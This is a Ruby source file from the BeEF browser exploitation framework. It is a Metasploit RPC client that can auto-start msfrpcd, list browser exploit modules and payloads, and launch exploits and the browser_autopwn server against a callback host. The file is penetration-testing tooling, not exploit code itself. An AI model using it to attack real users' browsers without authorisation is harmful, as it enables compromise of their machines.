#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
module Extension
module Metasploit
  
	class RpcClient < ::Msf::RPC::Client
		
		include Singleton

        def initialize
			@config = BeEF::Core::Configuration.instance.get('beef.extension.metasploit')

            if not (@config.key?('host') or @config.key?('uri') or @config.key?('port') or @config.key?('user') or @config.key?('pass'))
				print_error 'There is not enough information to initalize Metasploit connectivity at this time'
				print_error 'Please check your options in config.yaml to verify that all information is present'
                BeEF::Core::Configuration.instance.set('beef.extension.metasploit.enabled', false)
                BeEF::Core::Configuration.instance.set('beef.extension.metasploit.loaded', false)
                return nil
            end
		  
            		@lock = false
			@lastauth = nil
			@unit_test = false
			opts = {
				 :host => @config['host'] || '127.0.0.1',
				 :port => @config['port'] || 55552,
				 :uri => @config['uri'] || '/api/',
				 :ssl => @config['ssl'] ,
				 :ssl_version => @config['ssl_version'] ,
				 :context => {}
 			}
			#auto start msfrpcd
			if (@config['auto_msfrpcd'] || false)
				launch_msf = ''
				msf_os = ''
				@config['msf_path'].each do |path|
					if File.exist?(path['path'] + 'msfrpcd')
						launch_msf = path['path'] + 'msfrpcd'
						print_info 'Found msfrpcd: ' + launch_msf
						msf_os = path['os'] 
					end
				end
				if (launch_msf.length > 0)
					msf_url = ''
					argssl = ''
					if not opts[:ssl]
						argssl = '-S'
						msf_url = 'http://'
					else
						msf_url = 'https://'	
					end

					msf_url += opts[:host] + ':' + opts[:port].to_s() + opts[:uri]
					if msf_os.eql? "win"
						print_info 'Metasploit auto-launch is currently not supported in BeEF on MS Windows.'
					else	
						child = IO.popen([launch_msf, "-f", argssl, "-P" , @config['pass'], "-U" , @config['user'], "-u" , opts[:uri], "-a" , opts[:host], "-p" , opts[:port].to_s()], 'r+')
				
						print_info 'Attempt to start msfrpcd, this may take a while. PID: ' + child.pid.to_s

						#Give daemon time to launch
						#poll and giveup after timeout 
						retries = @config['auto_msfrpcd_timeout']
						uri = URI(msf_url)
						http = Net::HTTP.new(uri.host, uri.port)

						if opts[:ssl]
							http.use_ssl = true
						end
						if not @config['ssl_verify']
							http.verify_mode = OpenSSL::SSL::VERIFY_NONE
						end
						headers = {
    							'Content-Type' => "binary/message-pack"
						}
						path = uri.path.empty? ? "/" : uri.path
						begin
							sleep 1
							code = http.head(path, headers).code.to_i
						rescue Exception
							retry if (retries -= 1) > 0
						end
					end
				else
					print_error 'Please add a custom path for msfrpcd to the config-file.'
				end
			end	
			super(opts)
	    end
    
        def get_lock()
            sleep 0.2 while @lock 
            @lock = true
        end
    
        def release_lock()
            @lock = false
        end
	def call(meth, *args)
		ret = nil
		begin
			ret = super(meth,*args)
		rescue Exception => e
			return nil
		end
		ret
	end
    
	def unit_test_init
		@unit_test = true
	end
        # login into metasploit
		def login
            		get_lock()
			res = super(@config['user'] , @config['pass'])
			
		 	if not res
                		release_lock()
                		print_error 'Could not authenticate to Metasploit xmlrpc.'
				return false
			end
			
			print_info 'Successful connection with Metasploit.' if (!@lastauth && !@unit_test)
			
			@lastauth = Time.now
      
            		release_lock()
			true
		end
    
		def browser_exploits()
                
      			get_lock()
			res = self.call('module.exploits')
			return [] if not res or not res['modules']

			mods = res['modules']
			ret = []
			
			mods.each do |m|
				ret << m if(m.include? '/browser/')
			end
			
      			release_lock()
			ret.sort
	  end

		def get_exploit_info(name)
      			get_lock()
			res = self.call('module.info','exploit',name)
      			release_lock()
			res || {}
		end
		
		def get_payloads(name)
      			get_lock()
			res = self.call('module.compatible_payloads',name)
      			release_lock()
			res || {}
		end
		
		def get_options(name)
      			get_lock()
			res = self.call('module.options','exploit',name)
      			release_lock()
			res || {}
		end
		
		def payloads()
      			get_lock()
			res = self.call('module.payloads')
      			release_lock()
			return {} if not res or not res['modules']
			res['modules']
		end
		
		def payload_options(name)
      			get_lock()
			res = self.call('module.options','payload',name)
      			release_lock
			return {} if not res
			res
		end
		
		def launch_exploit(exploit,opts)
      			get_lock()
			begin
				res = self.call('module.execute','exploit',exploit,opts)
			rescue Exception => e
				print_error "Exploit failed for #{exploit} \n"
        			release_lock()
				return false
			end
      
      			release_lock()

			uri = ""
			if opts['SSL'] 
				uri += "https://"
			else
				uri += "http://"
			end

			uri += @config['callback_host'] + ":#{opts['SRVPORT']}/" + opts['URIPATH']

			res['uri'] = uri
			res
		end

		def launch_autopwn
			opts = {
				'LHOST' => @config['callback_host'] ,
				'URIPATH' => @apurl
				}
      			get_lock()
			begin
				res = self.call('module.execute','auxiliary','server/browser_autopwn',opts)
			rescue Exception => e
				print_error "Failed to launch autopwn\n"
        			release_lock()
				return false
			end
      			release_lock()
			return res

		end
		
	end
	
end
end
end
